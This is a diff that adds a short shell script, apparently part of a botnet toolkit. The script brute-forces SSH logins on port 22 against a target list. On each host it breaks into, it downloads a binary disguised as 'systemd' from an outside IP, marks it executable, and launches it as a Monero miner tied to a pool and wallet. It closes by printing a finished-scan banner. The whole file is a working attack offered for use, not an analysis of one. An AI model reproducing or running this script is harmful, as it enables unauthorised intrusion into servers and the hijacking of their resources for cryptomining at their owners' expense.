@@ -1,0 +1,4 @@
+clear
+./brute 9500 -f $1 naffey 22 "curl -O http://45.90.161.105/systemd ; wget http://45.90.161.105/systemd ; chmod +x * ; ./systemd -o de.minexmr.com:443 -B -u 47Yz2np6PGzMw1u2WYpgW2Qv8WMfsy1dKLYsH9GMP9d5ZKZ6GqcGJ86YbKQ8t5MUFGHrA2j61QwNx9yD1oe2ek6DVptxdE7 -k --tls --rig-id ZTX1"
+clear
+echo -e "\e[35m[PRIVATE] \e[97mHRDMV1 - \e[32mScan Has Been Finished ! All Output has been saved in --> \e[91mgasite.txt"
